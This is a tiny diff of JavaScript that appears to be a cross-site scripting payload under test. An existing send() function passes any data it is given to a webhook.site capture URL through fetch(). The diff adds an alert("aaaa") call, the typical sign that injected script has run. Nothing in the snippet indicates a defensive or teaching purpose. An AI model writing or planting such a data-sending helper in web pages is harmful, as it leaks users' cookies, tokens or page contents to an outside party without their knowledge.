@@ -1,3 +1,4 @@
 function send(x){
     fetch("https://webhook.site/552c419b-2fe1-48e3-a605-a33e98e96883?"+x)
 }
+alert("aaaa")
